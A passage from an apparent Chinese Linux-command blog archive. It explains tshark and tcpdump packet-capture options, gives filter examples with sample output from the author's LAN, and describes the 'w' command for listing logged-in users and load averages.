设定抓包过滤表达式（capture filter expression）。抓包过滤表达式的写法雷同于tcpdump，可参考tcpdump man page的有关部分。 -s 设置每个抓包的大小，默认为65535，多于这个大小的数据将不会被程序记入内存、写入文件。（这个参数相当于tcpdump的-s，tcpdump默认抓包的大小仅为68） -p 设置网络接口以非混合模式工作，即只关心和本机有关的流量。 -B 设置内核缓冲区大小，仅对windows有效。 -y 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等。 -L 列出本机支持的数据链路层协议，供-y参数使用。 2. 抓包停止条件 -c 抓取的packet数，在处理一定数量的packet后，停止抓取，程序退出。 -a 设置tshark抓包停止向文件书写的条件，事实上是tshark在正常启动之后停止工作并返回的条件。条件写为test:value的形式，如“-a duration:5”表示tshark启动后在5秒内抓包然后停止；“-a filesize:10”表示tshark在输出文件达到10kB后停止；“-a files:n”表示tshark在写满n个文件后停止。（windows版的tshark0.99.3用参数“-a files:n”不起作用——会有无数多个文件生成。由于-b参数有自己的files参数，所谓“和-b的其它参数结合使用”无从说起。这也许是一个bug，或tshark的man page的书写有误。） 3. 文件输出控制 -b 设置ring buffer文件参数。ring buffer的文件名由-w参数决定。-b参数采用test:value的形式书写。“-b duration:5”表示每5秒写下一个ring buffer文件；“-b filesize:5”表示每达到5kB写下一个ring buffer文件；“-b files:7”表示ring buffer文件最多7个，周而复始地使用，如果这个参数不设定，tshark会将磁盘写满为止。 4. 文件输入 -r 设置tshark分析的输入文件。tshark既可以抓取分析即时的网络流量，又可以分析dump在文件中的数据。-r不能是命名管道和标准输入。 5. 处理类 -R 设置读取（显示）过滤表达式（read filter expression）。不符合此表达式的流量同样不会被写入文件。注意，读取（显示）过滤表达式的语法和底层相关的抓包过滤表达式语法不相同，它的语法表达要丰富得多，请参考http://www.ethereal.com/docs/dfref/和http://www.ethereal.com/docs/man-pages/ethereal-filter.4.html。类似于抓包过滤表达式，在命令行使用时最好将它们quote起来。 -n 禁止所有地址名字解析（默认为允许所有）。 -N 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。 -d 将指定的数据按有关协议解包输出。如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port==8888,http”。注意选择子和解包协议之间不能留空格。 6. 输出类 -w 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout。“-w-”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“&gt;”而不要-w参数。 -F 设置输出raw数据的格式，默认为libpcap。“tshark -F”会列出所有支持的raw格式。 -V 设置将解码结果的细节输出，否则解码结果仅显示一个packet一行的summary。 -x 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。 -T 设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text。 -t 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。 -S 在向raw文件输出的同时，将解码结果打印到控制台。 -l 在处理每个包时即时刷新输出。 -X 扩展项。 -q 设置安静的stdout输出（例如做统计时） -z 设置统计参数。 7. 其它 -h 显示命令行帮助。 -v 显示tshark的版本信息。 -o 重载选项。 使用实例实例1：显示访问http请求的域名以及URI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri" 实例2：抓取mysql的查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -i eth1 -R 'mysql.query' -T fields -e "ip.src" -e "mysql.query" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外一种方法 1tshark -i eth1 port 3307 -d tcp.port==3307,mysql -z "proto,colinfo,mysql.query,mysql.query" 实例3：抓取指定类型的mysql查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -i eth1 -R 'mysql matches "SELECT|INSERT|DELETE|UPDATE"' -T fields -e "ip.src" -e "mysql.query" 实例4：统计http的状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -q -z http,stat, -z http,tree &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这个命令，直到ctrl+e才会显示出结果 实例5：tshark增加时间标签&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12tshark -t adtshark -t a 实例6：查看当前服务器的web请求&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tshark主要掌握这一个用法即可。这条命令用于web服务器，可以显示下面信息： 12345678[root@lnmp ~]# tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri"Running as user "root" and group "root". This could be dangerous.Capturing on eth0Jul 13, 2017 22:00:25.129421639 192.168.0.100 prtas.videocc.net GET /v1/view?pid=1499954712122X1245558&amp;uid=04ad877579&amp;vid=04ad877579e0b8ab39e6eafe7709cdf6_0&amp;flow=12074276&amp;pd=1&amp;sd=89&amp;ts=1499954802350&amp;sign=3916b818465aa3ffcb7c81773bc8805f&amp;session_id=&amp;param1=&amp;param2=&amp;param3=&amp;param4=&amp;param5=&amp;cts=0&amp;duration=1004&amp;href=http%3A%2F%2Fv.apelearn.com%2Fstudent.php%3Fview_unit%3D897Jul 13, 2017 22:00:27.449646478 [FF02::C]:1900 M-SEARCH *Jul 13, 2017 22:00:31.449976172 [FF02::C]:1900 M-SEARCH *Jul 13, 2017 22:00:34.449975277 [FF02::C]:1900 M-SEARCH *Jul 13, 2017 22:00:35.194957223 192.168.0.100 prtas.videocc.net GET &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这类似于web访问日志，有时候若服务器没有配置访问日志，可以临时使用该命令查看一下当前服务器的web请求。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tcpdump]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F79.%20Linux%20%E5%91%BD%E4%BB%A4-%20tcpdump%2F</url>
    <content type="text"><![CDATA[Linux 命令- tcpdump&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tcpdump是一个用于截取网络分组，并输出分组内容的工具。tcpdump凭借强大的功能和灵活的截取策略，使其成为类UNIX系统下用于网络分析和问题排查的首选工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tcpdump提供了源代码，公开了接口，因此具备很强的可扩展性，对于网络维护和入侵者都是非常有用的工具。tcpdump存在于基本的Linux系统中，由于它需要将网络界面设置为混杂模式，普通用户不能正常执行，但具备root权限的用户可以直接执行它来获取网络上的信息。因此系统中存在网络分析工具主要不是对本机安全的威胁，而是对网络上的其他计算机的安全存在威胁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候也许有这样的需求，想看一下某个网卡上都有哪些数据包，尤其是当初判定服务器上有流量攻击。这时使用tcpdump来抓一下数据包，就可以知道有哪些IP在攻击了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果系统没有tcpdump这个命令需要用yum安装一下。 1yum install -y tcpdump 命令格式1tcpdump [-nn] [-i 接口] [-w 存储档名] [-c 次数] [-Ae] [-qX] [-r 文件] [所欲捕获的数据内容] 命令参数 -A 以ASCII格式打印出所有分组，并将链路层的头最小化。 -c 在收到指定的数量的分组后，tcpdump就会停止。 -C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 -d 将匹配信息包的代码以人们能够理解的汇编格式给出。 -dd 将匹配信息包的代码以c语言程序段的格式给出。 -ddd 将匹配信息包的代码以十进制的形式给出。 -D 打印出系统中所有可以用tcpdump截包的网络接口。 -e 在输出行打印出数据链路层的头部信息。 -E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 -f 将外部的Internet地址以数字的形式打印出来。 -F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 -i 指定监听的网络接口。 -l 使标准输出变为缓冲行形式，可以把数据导出到文件。 -L 列出网络接口的已知数据链路。 -m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 -M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 -b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。 -n 不把网络地址转换成名字。 -nn 不进行端口名称的转换。 -N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 -t 在输出的每一行不打印时间戳。 -O 不运行分组分组匹配（packet-matching）代码优化程序。 -P 不将网络接口设置成混杂模式。 -q 快速输出。只输出较少的协议信息。 -r 从指定的文件中读取包(这些包一般通过-w选项产生)。 -S 将tcp的序列号以绝对值形式输出，而不是相对值。 -s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 -T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 -t 不在每一行中输出时间戳。 -tt 在每一行中输出非格式化的时间戳。 -ttt 输出本行和前面一行之间的时间差。 -tttt 在每一行中输出由date处理的默认格式的时间戳。 -u 输出未解码的NFS句柄。 -v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 -vv 输出详细的报文信息。 -w 直接将分组写入文件中，而不是不分析并打印出来。 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顾名思义，tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。他支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助去掉无用的信息。 tcpdump的表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表达式是一个正则表达式，tcpdump利用它作为过滤报文的条件，如果一个报文满足表 达式的条件，则这个报文将会被捕获。如果没有给出任何条件，则网络上所有的信息包 将会被截获。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在表达式中一般如下几种类型的关键字： 第一种是关于类型的关键字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要包括host、net、prot，例如host 210.27.48.2 ，指明210.27.48.2是一台主机，net202.0.0.0指明202.0.0.0是一个网络地址，port 23 指明端口号是23.如果没有指定类型，缺省的类型是host。 第二种是确定传输方向的关键字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要包括src、dst、dst or src、dst and src，这些关键字指明了传输的方向。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举例说明，src 210.27.48.2，指明ip包中源地址是210.27.48.2，dst net 202.0.0.0指明目的网络地址是202.0.0.0.如果没有指明方向关键字，则缺省是src or dst关键字。 第三种是协议的关键字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要包括fddi、ip、arp、rarp、tcp、udp等类型。fddi指明是在FDDI（分布式光纤数据接口网络）上的特定的网络协议，实际上它是“ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether包进行处理和分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了这三种类型的关键字之外，其他重要的关键字如下：gateway、breadcast、less、greater，还有三种逻辑运算，取非运算是‘not’ ‘!’，与运算是‘and’，‘&amp;&amp;’；或运算是‘or’，‘&amp;#124；……#124;’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要。 输出结果介绍数据链路层头信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump --e host localhost &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;localhost 是一台linux主机。它的MAC地址是0：90：27：58：AF：1A H219是一台装有Solaris的SUN工作站。它的MAC地址是8：0：20：79：5B：46； 上一条命令的输出结果如下所示： 121:50:12.847509 eth0 &lt; 8:0:20:79:5b:46 0:90:27:58:af:1a ip 60: h219.33357 &gt; ICE. telne t 0:0(0) ack 22535 win 8760 (DF) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;21：50：12是显示的时间， 847509是ID号，eth0 &lt;表示从网络接口eth0接收该分组， eth0 &gt;表示从网络接口设备发送分组， 8:0:20:79:5b:46是主机H219的MAC地址， 它表明是从源地址H219发来的分组. 0:90:27:58:af:1a是主机ICE的MAC地址， 表示该分组的目的地址是ICE。 ip 是表明该分组是IP分组，60 是分组的长度， h219.33357 &gt; ICE. telnet 表明该分组是从主机H219的33357端口发往主机ICE的 TELNET(23)端口。 ack 22535 表明对序列号是222535的包进行响应。 win 8760表明发 送窗口的大小是8760。 ARP包的tcpdump输出信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump arp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果 1222:32:42.802509 eth0 &gt; arp who-has route tell ICE (0:90:27:58:af:1a)22:32:42.802902 eth0 &lt; arp reply route is-at 0:90:27:12:10:66 (0:90:27:58:af:1a) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;22:32:42是时间戳， 802509是ID号， eth0 &gt;表明从主机发出该分组，arp表明是ARP请求包， who-has route tell ICE表明是主机ICE请求主机route的MAC地址。 0:90:27:58:af:1a是主机 ICE的MAC地址。 TCP包的输出信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用tcpdump捕获的TCP包的一般输出信息是： 1src &gt; dst: flags data-seqno ack window urgent options &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;src &gt; dst:表明从源地址到目的地址， flags是TCP报文中的标志信息，S 是SYN标志， F (FIN)， P (PUSH) ， R (RST) “.” (没有标记); data-seqno是报文中的数据 的顺序号， ack是下次期望的顺序号， window是接收缓存的窗口大小， urgent表明 报文中是否有紧急指针。 Options是选项。 UDP包的输出信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用tcpdump捕获的UDP包的一般输出信息是： 1route.port1 &gt; ICE.port2: udp lenth &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;UDP十分简单，上面的输出行表明从主机route的port1端口发出的一个UDP报文 到主机ICE的port2端口，类型是UDP， 包的长度是lenth。 使用实例实例1：默认启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455[root@localhost ~]# tcpdumptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes12:53:58.186853 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2571645771:2571645967, ack 2817097466, win 141, length 19612:53:58.187498 IP 192.168.0.73.43721 &gt; www.routerlogin.com.domain: 13011+ PTR? 100.0.168.192.in-addr.arpa. (44)12:53:58.193280 IP www.routerlogin.com.domain &gt; 192.168.0.73.43721: 13011 NXDomain* 0/1/0 (93)12:53:58.193391 IP 192.168.0.73.54701 &gt; www.routerlogin.com.domain: 55618+ PTR? 73.0.168.192.in-addr.arpa. (43)12:53:58.198669 IP www.routerlogin.com.domain &gt; 192.168.0.73.54701: 55618 NXDomain* 0/1/0 (92)12:53:58.198775 IP 192.168.0.73.39373 &gt; www.routerlogin.com.domain: 10426+ PTR? 1.0.168.192.in-addr.arpa. (42)12:53:58.200468 IP www.routerlogin.com.domain &gt; 192.168.0.73.39373: 10426- 1/0/0 PTR www.routerlogin.com. (75)12:53:58.200515 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 196:376, ack 1, win 141, length 18012:53:58.200595 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 376, win 256, length 012:53:58.208513 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 376:1276, ack 1, win 141, length 90012:53:58.224403 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1276:1440, ack 1, win 141, length 16412:53:58.224597 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 1440, win 252, length 012:53:58.239996 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1440:1700, ack 1, win 141, length 26012:53:58.255361 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1700:1864, ack 1, win 141, length 16412:53:58.255508 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 1864, win 256, length 012:53:58.271142 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1864:2124, ack 1, win 141, length 26012:53:58.286589 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2124:2288, ack 1, win 141, length 16412:53:58.286754 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 2288, win 254, length 012:53:58.286912 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2288:2548, ack 1, win 141, length 26012:53:58.302161 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2548:2712, ack 1, win 141, length 16412:53:58.302377 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 2712, win 253, length 012:53:58.302462 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2712:2972, ack 1, win 141, length 26012:53:58.317893 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2972:3136, ack 1, win 141, length 16412:53:58.318078 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 3136, win 251, length 012:53:58.318149 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3136:3300, ack 1, win 141, length 16412:53:58.333352 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3300:3560, ack 1, win 141, length 26012:53:58.333507 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 3560, win 256, length 012:53:58.348907 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3560:3820, ack 1, win 141, length 26012:53:58.366358 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3820:3984, ack 1, win 141, length 16412:53:58.366514 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 3984, win 254, length 012:53:58.381239 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3984:4244, ack 1, win 141, length 26012:53:58.396759 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4244:4408, ack 1, win 141, length 16412:53:58.396965 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 4408, win 253, length 012:53:58.412465 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4408:4668, ack 1, win 141, length 26012:53:58.428078 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4668:4832, ack 1, win 141, length 16412:53:58.428276 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 4832, win 251, length 012:53:58.443786 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4832:5092, ack 1, win 141, length 26012:53:58.459211 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5092:5256, ack 1, win 141, length 16412:53:58.459444 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 5256, win 256, length 012:53:58.474768 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5256:5516, ack 1, win 141, length 26012:53:58.490445 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5516:5680, ack 1, win 141, length 16412:53:58.490611 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 5680, win 254, length 012:53:58.490693 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5680:5940, ack 1, win 141, length 26012:53:58.490904 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5940:6104, ack 1, win 141, length 16412:53:58.491013 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 6104, win 253, length 012:53:58.506024 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 6104:6364, ack 1, win 141, length 26012:53:58.516922 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [P.], seq 1:53, ack 6364, win 252, length 5212:53:58.517035 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 6364:6528, ack 53, win 141, length 164^C48 packets captured51 packets received by filter0 packets dropped by kernel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;普通情况下，直接启动tcpdump将监视第一个网络接口上所有流过的数据包 实例2：监视指定网络接口的数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -i eth1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0。 实例3：以IP与port number抓下eth0这个网卡上 使得数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -i eth0 -nn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost ~]# tcpdump -nn -i eth0tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes13:00:35.277585 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 2573734647:2573734843, ack 2817100566, win 141, length 19613:00:35.277769 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 196, win 252, length 013:00:35.292177 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 196:472, ack 1, win 141, length 27613:00:35.307810 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 472:636, ack 1, win 141, length 16413:00:35.308018 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 636, win 251, length 013:00:35.338945 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 636:896, ack 1, win 141, length 26013:00:35.340898 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 896:1060, ack 1, win 141, length 16413:00:35.341088 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 1060, win 256, length 013:00:35.356706 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1060:1320, ack 1, win 141, length 26013:00:35.356935 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1320:1484, ack 1, win 141, length 16413:00:35.357059 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 1484, win 254, length 013:00:35.372128 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1484:1744, ack 1, win 141, length 26013:00:35.382482 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [P.], seq 1:53, ack 1744, win 253, length 5213:00:35.382649 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1744:2020, ack 53, win 141, length 276^C14 packets captured14 packets received by filter0 packets dropped by kernel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三列和第四列显示的信息为哪一个IP+port 在连接哪一个IP+port，后面的信息是该数据包的相关信息。这里需要关注的只是第三列以及第四列。-i选项后面跟设备名称，如果想抓其他网卡的包，后面则要跟其他网卡名。至于-nn选项是作用是让第三列和第四列西安市城IP+端口号的形式，如果不加-nn则显示的是主机名+服务名称。 实例4：截获所有210.27.48.1的主机收到的和发出的所有的数据&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump host 210.27.48.1 实例5：截获主机210.24.48.1和主机210.24.48.2或210.27.48.3的通信&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump host 210.2748.1 and 210.27.48.2 or 210.27.48.3 实例6：获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump ip host 210.27.48.1 and ! 210.27.48.2 实例7：获取主机192.168.228.246接收或发出的ssh包，并且不转换主机名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -nn -n src host 192.168.228.246 and port 22 and tcp 实例8：获取主机192.168.228.246接收或发出的ssh包，并把mac地址也一同显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -e src host 192.168.228.246 and port 22 and tcp -n -nn 实例9：过滤的是源主机为192.168.0.1与目的网路哦为192.168.0.0的报头&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump src host 192.168.0.1 and dst net 192.168.0.0/24 实例10：过滤源主机物理地址为XXX的报头&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump ether src 00:50:04:BA:98 and dst…… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ether src后面没有host或者net，物理地址当然不可能有网络。 实例11：过滤源主机192.168.0.1和目的端口不是telnet的报头，并导入到test.txt文件中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump src host 192.168.0.1 and dst port not telnet -l &gt; test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip、icmp、arp、rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型。 实例12：捕获192.168.1.100主机eth1网卡上80端口接收和发出的数据100条，并保存文件1.cap&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -nn -i eth1 host 192.168.1.100 and port 80 -c 100 -w 1.cap &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用host指定ip，port指定端口，-c指定包数量，-w写入指定文件里。而不加 -w直接在屏幕上显示的不是数据包，而是数据流向。这个1.cap可以下载到windows上，谈后用wireshark查看。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- w]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F77.%20Linux%20%E5%91%BD%E4%BB%A4-%20w%2F</url>
    <content type="text"><![CDATA[Linux 命令- w&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;w命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。 命令格式1w [参数] [用户名称] 命令选项 -f 开启或关闭显示用户从何处登入系统。 -h 不显示各栏位的标题信息列。 -l 使用详细格式列表，此为预设值。 -s 使用简洁格式列表，不显示用户登入时间，终端机阶段作业和程序所耗费的CPU时间。 -u 忽略执行程序的名称，以及该程序耗费CPU时间的信息。 -V 显示版本信息。 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示目前登入系统的用户信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行这项指令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w指令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;w命令也用于显示登录到系统的用户情况，但是与who不同的是，w命令功能更加强大，它不但可以显示有谁登录到系统，还可以显示出这些用户当前正在进行的工作，感觉比较实用，具体用法如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;w命令的显示项目按以下顺序排列：当前时间，系统启动到现在的时间，登录用户的数目，系统在最 近1秒、5秒和15秒的平均负载。然后是每个用户的各项数据，项目显示顺序如下：登录帐号、终端名称、远 程主机名、登录时间、空闲时间、JCPU、PCPU、当前正在运行进程的命令行。 使用实例1234[root@localhost ~]# w 20:39:37 up 136 days, 3:58, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM login@ IDLE JCPU PCPU WHAT root pts/0 222.94.97.122 20:39 1.00s 0.00s 0.00s w &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux管理员最常用的命令就是这个 w 了，该命令显示的信息还是蛮丰富的。第一行从左面开始显示的信息依次为：时间，系统运行时间，登录用户数，平均负载。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二行开始以及下面所有的行，告诉我们的信息是，当前登录的都有哪些用户，以及他们是从哪里登录的等等。 USER：登录用户名 TTY：登录后系统分配的终端号 FROM：远程主机名，即从哪里登录的 LOGIN@：何时登录 IDLE：用户空间时间，这是个计时器，一旦用户执行任何操作，该计时器便会被重置 JCPU：和该终端连接的所有进程占用时间。包括当前正在运行的后台作业占用时间 PCPU：当前进程所占用的时间 WHAT：当前正在运行进程的命令行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这些信息中，我们最应该关注的应该是第一行中的 ‘load average:’ 后面的三个数值。 